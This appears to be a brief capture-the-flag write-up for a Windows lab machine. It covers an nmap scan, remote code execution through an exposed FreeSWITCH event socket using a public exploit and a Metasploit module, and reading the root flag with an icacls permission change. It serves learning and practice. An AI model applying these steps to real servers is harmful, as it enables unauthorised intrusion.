# Flatline

### Flatline
Nmap scan finds port 3389 and 8021 open. The machine doesn't respond to pings, so to scan it always use the `-Pn` flag.

    PORT     STATE SERVICE          VERSION
    3389/tcp open  ms-wbt-server    Microsoft Terminal Services
    | rdp-ntlm-info: 
    |   Target_Name: WIN-EOM4PK0578N
    |   NetBIOS_Domain_Name: WIN-EOM4PK0578N
    |   NetBIOS_Computer_Name: WIN-EOM4PK0578N
    |   DNS_Domain_Name: WIN-EOM4PK0578N
    |   DNS_Computer_Name: WIN-EOM4PK0578N
    |   Product_Version: 10.0.17763
    |_  System_Time: 2025-01-27T13:01:46+00:00
    |_ssl-date: 2025-01-27T13:01:51+00:00; +1s from scanner time.
    | ssl-cert: Subject: commonName=WIN-EOM4PK0578N
    | Not valid before: 2025-01-26T12:57:53
    |_Not valid after:  2025-07-28T12:57:53
    8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Searching online, I found [this exploit](https://www.exploit-db.com/exploits/47799) that's an RCE for a specific version of FreeSWITCH. Apparently it works well:<br />
![image](https://github.com/user-attachments/assets/6288778b-a541-4b94-88ef-dff74442806c)<br />
I also found a metasploit module `multi/misc/freeswitch_event_socket_cmd_exec`. Remember to run `set target 3` before executing the exploit. Now that I have a shell, I find both flags inside `C:\Users\Nekrotic\Desktop`, but I can't read root.txt.<br />
Now for privesc, If I run `whoami /priv` I get: <br />
![image](https://github.com/user-attachments/assets/4d9a70e7-f5d5-4e6a-bbb4-e9ca9f033c4b)<br />
I have the privilege `SeDebugPrivilege`.
I just run `icacls "C:\Users\Nekrotic\Desktop\root.txt" /grant %USERNAME%:R` and can now read the root flag with `type root.txt`.

